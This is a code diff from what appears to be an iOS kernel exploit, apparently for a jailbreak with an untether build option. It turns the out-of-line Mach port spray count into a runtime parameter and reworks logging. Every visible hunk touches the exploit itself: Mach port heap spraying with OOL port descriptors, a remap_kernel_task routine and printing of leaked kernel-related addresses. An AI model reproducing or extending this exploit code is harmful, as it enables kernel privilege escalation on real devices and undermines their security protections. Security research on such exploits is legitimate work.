@@ -16,10 +16,12 @@ void print_log(const char *fmt, ...) {
     va_start(va, fmt);
     vsnprintf(buf, sizeof(buf), fmt, va);
     va_end(va);
+
+#ifndef UNTETHER
     syslog(LOG_ERR, "%s", buf);
     fprintf(stderr, "%s", buf);
     fflush(stderr);
-#ifdef UNTETHER
+#else
     static int console_fd = -1;
     if (console_fd < 0) {
         console_fd = open("/dev/console", O_WRONLY | O_NOCTTY);
@@ -85,13 +87,13 @@ int create_oob_entry(void) {
     return 0;
 }
 
-int create_ool_helper(mach_port_t *port, uint32_t *addr) {
+int create_ool_helper(mach_port_t *port, uint32_t *addr, int ool_count) {
     mach_port_t remote = create_mach_port();
     mach_port_t task = mach_task_self();
     mach_port_t host = mach_host_self();
 
     mach_port_limits_t limits = {0};
-    limits.mpl_qlimit = OOL_COUNT;
+    limits.mpl_qlimit = ool_count;
     mach_port_set_attributes(task, remote, 1, (mach_port_info_t)&limits, MACH_PORT_LIMITS_INFO_COUNT);
 
     mach_port_t *port_list = calloc(1, 1024 * 0x4);
@@ -117,7 +119,7 @@ int create_ool_helper(mach_port_t *port, uint32_t *addr) {
     msg->ool_ports.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
     msg->ool_ports.copy = MACH_MSG_PHYSICAL_COPY;
     
-    for (uint32_t i = 0; i < OOL_COUNT; i++) {
+    for (uint32_t i = 0; i < ool_count; i++) {
         mach_msg(&msg->hdr, MACH_SEND_MSG, msg->hdr.msgh_size, 0, 0, 0, 0);
     }
     
@@ -200,7 +202,7 @@ int remap_kernel_task(void) {
     return 0;
 }
 
-int run_exploit(void) {
+int run_exploit(int ool_count) {
     uint64_t timer = timer_start();
     kinfo = calloc(1, sizeof(kinfo_t));
     int status = -1;
@@ -238,7 +240,7 @@ int run_exploit(void) {
 
     mach_port_t ool_port = MACH_PORT_NULL;
     uint32_t ool_addr = 0;
-    if (create_ool_helper(&ool_port, &ool_addr) != 0) goto done;
+    if (create_ool_helper(&ool_port, &ool_addr, ool_count) != 0) goto done;
     print_log("[*] ool_port: 0x%x\n", ool_port);
     print_log("[*] ool_addr: 0x%x\n", ool_addr);
     
@@ -257,7 +259,7 @@ int run_exploit(void) {
     usleep(10000);
 
     ool_msg_t *msg = calloc(1, 0x1000);
-    for (uint32_t i = 0; i < OOL_COUNT; i++) {
+    for (uint32_t i = 0; i < ool_count; i++) {
         bzero(msg, 0x1000);
         mach_msg(&msg->hdr, MACH_RCV_MSG, 0, 0x1000, ool_port, 0, 0);
 
